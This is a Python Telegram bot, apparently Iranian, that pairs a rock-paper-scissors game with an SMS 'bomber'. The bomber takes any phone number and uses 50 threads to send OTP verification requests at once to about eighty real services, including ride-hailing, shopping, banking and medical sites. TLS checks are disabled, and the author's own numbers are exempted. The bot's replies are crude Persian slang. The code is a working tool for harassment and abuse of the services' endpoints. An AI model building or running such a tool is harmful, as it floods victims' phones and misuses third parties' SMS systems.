import os
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import telebot
import urllib3
from flask import Flask
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)


def determine_winner(user_choice, bot_choice):
    if user_choice == bot_choice:
        return "مساوی شدیم!"
    elif (user_choice == "rock" and bot_choice == "scissors") or \
         (user_choice == "paper" and bot_choice == "rock") or \
         (user_choice == "scissors" and bot_choice == "paper"):
        return "تو بردی 🎉"
    else:
        return "من بردم 😎"


def get_choice_image(choice):
    if choice == "rock":
        return "https://media.istockphoto.com/id/2161977156/photo/stone-image-on-a-white-background.jpg"
    elif choice == "paper":
        return "https://media.istockphoto.com/id/1501496073/photo/blank-a4-paper-on-white-background.jpg"
    elif choice == "scissors":
        return "http://t3.gstatic.com/licensed-image?q=tbn:ANd9GcRuoTRO-VCcFSDxLxO4e8Ifvld1w5FbOJSibhdkWsMOoU_hfh_IzJLWeRj5zWwjhu_GwgmAbVGFC238AO_HSkE"


SERVICES = {
    'snapp': lambda num: requests.post(
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": f"+98{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'tapsi': lambda num: requests.post(
        url="https://tap33.me/api/v2/user",
        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'digikala': lambda num: requests.post(
        url="https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'divar': lambda num: requests.post(
        url="https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'snappfood': lambda num: requests.post(
        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
        json={"cellphone": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'alibaba': lambda num: requests.post(
        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
        json={"phoneNumber": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'banimod': lambda num: requests.post(
        url="https://mobapi.banimode.com/api/v2/auth/request",
        json={"phone": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'bit24': lambda num: requests.post(
        url="https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
        json={"mobile": f"0{num}", "country_code": "98"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'rubika': lambda num: requests.post(
        url="https://messengerg2c4.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {"phone_number": num, "send_type": "SMS"}
        },
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'drto': lambda num: requests.get(
        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
        params={"mobile": num, "captcha": "", "country_id": 205},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    '3tex': lambda num: requests.post(
        url="https://3tex.io/api/1/users/validation/mobile",
        json={"receptorPhone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'deniizshop': lambda num: requests.post(
        url="https://deniizshop.com/api/v1/sessions/login_request",
        json={"mobile_phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'behtarino': lambda num: requests.post(
        url="https://bck.behtarino.com/api/v1/users/phone_verification/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'azki': lambda num: requests.get(
        url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'pooleno': lambda num: requests.post(
        url="https://api.pooleno.ir/v1/auth/check-mobile",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'bama': lambda num: requests.post(
        url="https://bama.ir/signin-checkforcellnumber",
        data=f"cellNumber={num}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=5,
        verify=False
    ),
    'bitbarg': lambda num: requests.post(
        url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'bitpin': lambda num: requests.post(
        url="https://api.bitpin.ir/v1/usr/sub_phone/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'chamedoon': lambda num: requests.post(
        url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'kilid': lambda num: requests.get(
        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
        params={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'shab': lambda num: requests.post(
        url="https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'tapsishop': lambda num: requests.post(
        url="https://tapsi.shop/api/proxy/authCustomer/CreateOtpForRegister",
        json={"user": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'namava': lambda num: requests.post(
        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        json={"UserName": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'sheypoor': lambda num: requests.post(
        url="https://www.sheypoor.com/auth",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'snapp_ir': lambda num: requests.post(
        url="https://api.snapp.ir/api/v1/sms/link",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'nobat': lambda num: requests.post(
        url="https://nobat.ir/api/public/patient/login/phone",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'buskool': lambda num: requests.post(
        url="https://www.buskool.com/send_verification_code",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'simkhan': lambda num: requests.post(
        url="https://www.simkhanapi.ir/api/users/registerV2",
        json={"mobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'hiword': lambda num: requests.post(
        url="https://hiword.ir/wp-json/otp-login/v1/login",
        json={"identifier": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'bit24cash': lambda num: requests.post(
        url="https://api.bit24.cash/api/v3/auth/check-mobile",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'tikban': lambda num: requests.post(
        url="https://tikban.com/Account/LoginAndRegister",
        json={"CellPhone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'digistyle': lambda num: requests.post(
        url="https://www.digistyle.com/users/login-register/",
        json={"loginRegister[email_phone]": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'iranketab': lambda num: requests.post(
        url="https://www.iranketab.ir/account/register",
        json={"UserName": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'ketabchi': lambda num: requests.post(
        url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'offdecor': lambda num: requests.post(
        url="https://www.offdecor.com/index.php?route=account/login/sendCode",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'karafs': lambda num: requests.post(
        url="https://v2.karafsapp.com/requestCode",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'khanoumi': lambda num: requests.post(
        url="https://www.khanoumi.com/accounts/sendotp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'rojashop': lambda num: requests.post(
        url="https://rojashop.com/api/auth/sendOtp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'dadpardaz': lambda num: requests.post(
        url="https://dadpardaz.com/advice/getLoginConfirmationCode",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'mashinbank': lambda num: requests.post(
        url="https://mashinbank.com/api2/users/check",
        json={"mobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'pezeshket': lambda num: requests.post(
        url="https://api.pezeshket.com/core/v1/auth/requestCode",
        json={"mobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'virgool': lambda num: requests.post(
        url="https://virgool.io/api/v1.4/auth/verify",
        json={"method": "phone", "identifier": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'timcheh': lambda num: requests.post(
        url="https://api.timcheh.com/auth/otp/send",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'paklean': lambda num: requests.post(
        url="https://client.api.paklean.com/user/resendCode",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'mobogift': lambda num: requests.post(
        url="https://mobogift.com/signin",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'iranicard': lambda num: requests.post(
        url="https://api.iranicard.ir/api/v1/register",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'talasi': lambda num: requests.post(
        url="https://api.talasea.ir/api/auth/sentOTP",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'irantic': lambda num: requests.post(
        url="https://www.irantic.com/api/login/request",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'gharar': lambda num: requests.post(
        url="https://gharar.ir/users/phone_number/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'snappexpress': lambda num: requests.post(
        url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
        json={"cellphone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'delino': lambda num: requests.post(
        url="https://www.delino.com/user/register",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'alopeyk': lambda num: requests.post(
        url="https://alopeyk.com/api/sms/send.php",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'digikalajet': lambda num: requests.post(
        url="https://api.digikalajet.ir/user/login-register/",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'melix': lambda num: requests.post(
        url="https://api.algorock.com/api/Auth",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'dastkhat': lambda num: requests.post(
        url="https://dastkhat-isad.ir/api/v1/user/store",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'okala': lambda num: requests.post(
        url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'miare': lambda num: requests.post(
        url="https://www.miare.ir/api/otp/driver/request/",
        json={"phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'arshiyan': lambda num: requests.post(
        url="https://api.arshiyan.com/send_code",
        json={"country_code": "98", "phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'alopeyk_safir': lambda num: requests.post(
        url="https://api.alopeyk.com/safir-service/api/v1/login",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'dadhesab': lambda num: requests.post(
        url="https://api.dadhesab.ir/user/entry",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'dosma': lambda num: requests.post(
        url="https://app.dosma.ir/sendverify/",
        json={"username": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'ehteraman': lambda num: requests.post(
        url="https://api.ehteraman.com/api/request/otp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'mci': lambda num: requests.post(
        url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",
        json={"msisdn": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'hbbs': lambda num: requests.post(
        url="https://api.hbbs.ir/authentication/SendCode",
        json={"MobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'kcd': lambda num: requests.post(
        url="https://api.kcd.app/api/v1/auth/login",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'ostadkr': lambda num: requests.post(
        url="https://api.ostadkr.com/login",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'rayshomar': lambda num: requests.post(
        url="https://api.rayshomar.ir/api/Register/RegistrMobile",
        json={"MobileNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'snapp_digital': lambda num: requests.post(
        url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        json={"cellphone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'paresh': lambda num: requests.post(
        url="https://api.paresh.ir/api/user/otp/code/",
        json={"phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'watchonline': lambda num: requests.post(
        url="https://api.watchonline.shop/api/v1/otp/request",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'shadmessenger': lambda num: requests.post(
        url="https://shadmessenger12.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {"phone_number": num, "send_type": "SMS"}
        },
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'snappmarket': lambda num: requests.get(
        url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'mrbilit': lambda num: requests.get(
        url=f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={num}&source=2&sendTokenIfNot=true",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'filmnet': lambda num: requests.get(
        url=f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'torob': lambda num: requests.get(
        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'gapim': lambda num: requests.get(
        url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'mydigipay': lambda num: requests.post(
        url="https://app.mydigipay.com/digipay/api/users/send-sms",
        json={"cellNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    )
}

user_sessions = {}
blocked_numbers = {
    "09224005771",
    "09182649455",
    "09059250020",
    "09180520256",
    "09189834173"
}


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "درود خوش آمديد",
        reply_markup=main_menu()
    )


def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("💣 بمبر", "✂️ سنگ کاغذ قیچی")
    return markup


@bot.message_handler(func=lambda message: message.text == "💣 بمبر")
def bomb_button(message):
    bomb(message)


@bot.message_handler(commands=['bomb'])
def bomb(message):
    user_sessions[message.chat.id] = "waiting_phone"
    bot.send_message(message.chat.id, "شماره بده بيبي تا بگامش:")


@bot.message_handler(func=lambda message: message.text == "✂️ سنگ کاغذ قیچی")
def start_game(message):
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton("سنگ", callback_data="rock")
    button2 = types.InlineKeyboardButton("کاغذ", callback_data="paper")
    button3 = types.InlineKeyboardButton("قیچی", callback_data="scissors")
    markup.add(button1, button2, button3)

    restart_button = types.InlineKeyboardButton("شروع مجدد", callback_data="restart")
    markup.add(restart_button)

    bot.send_message(message.chat.id, "سلام! بازی سنگ، کاغذ، قیچی شروع شد. انتخاب خود را بزنید:", reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
def handle_game_choice(call):
    if call.data == "restart":
        start_game(call.message)
        return

    user_choice = call.data
    bot_choice = random.choice(["rock", "paper", "scissors"])
    result = determine_winner(user_choice, bot_choice)

    bot.send_photo(call.message.chat.id, get_choice_image(user_choice), caption=f"انتخاب شما: {user_choice}")
    bot.send_photo(call.message.chat.id, get_choice_image(bot_choice), caption=f"انتخاب من: {bot_choice}")
    bot.send_message(call.message.chat.id, result)

    markup = types.InlineKeyboardMarkup()
    restart_button = types.InlineKeyboardButton("شروع مجدد", callback_data="restart")
    markup.add(restart_button)
    bot.send_message(call.message.chat.id, "میخوای دوباره بازی کنیم؟", reply_markup=markup)


@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id

    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
        phone = message.text.strip()

        if phone in blocked_numbers:
            bot.send_message(chat_id, "چي فکر کردي عبو سوفيان ؟")
            gif = "https://uploadkon.ir/uploads/8d1624_25animation-2025-01-08-01-46-01-7516145351561052176.mp4"
            bot.send_animation(chat_id, gif)
            del user_sessions[chat_id]
            return
        
        user_sessions[chat_id] = "processing"
        progress_msg = bot.send_message(chat_id, "در حال ارسال...")
        
        success = 0
        failed = 0
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(service, phone): name for name, service in SERVICES.items()}
            
            for future in as_completed(futures):
                name = futures[future]
                try:
                    response = future.result()
                    if response.status_code in [200, 201, 202, 204]:
                        success += 1
                    else:
                        failed += 1
                except:
                    failed += 1
        
        bot.edit_message_text(
            f"گايش شد",
            chat_id=chat_id,
            message_id=progress_msg.message_id
        )
        
        del user_sessions[chat_id]


@app.route('/')
def home():
    return "Bot is running"


@app.route('/health')
def health():
    return "OK"


def run_flask():
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))


if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    bot.infinity_polling()
